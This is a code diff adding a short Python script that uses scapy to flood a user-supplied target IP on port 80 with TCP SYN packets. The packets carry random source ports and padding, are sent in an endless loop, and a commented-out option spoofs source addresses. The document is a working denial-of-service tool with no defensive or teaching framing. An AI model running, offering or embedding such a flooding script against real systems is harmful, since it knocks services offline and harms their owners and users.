@@ -1,0 +1,24 @@
+#!/bin/python3
+
+from scapy.all import *
+
+#Enter target ip address
+target = input("Enter target IP: ")
+
+#Port to flood
+target_port = 80
+
+ip = IP(dst=target)
+#For spoofing
+# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
+
+#TCP SYN Packet
+tcp_packet = TCP(sport=RandShort(), dport=target_port, flags="S")
+
+#Size
+raw_bytes = Raw(b"X"*1024)
+
+#Layers
+stack = ip / tcp_packet / raw_bytes
+
+send(stack, loop=1, verbose=0)
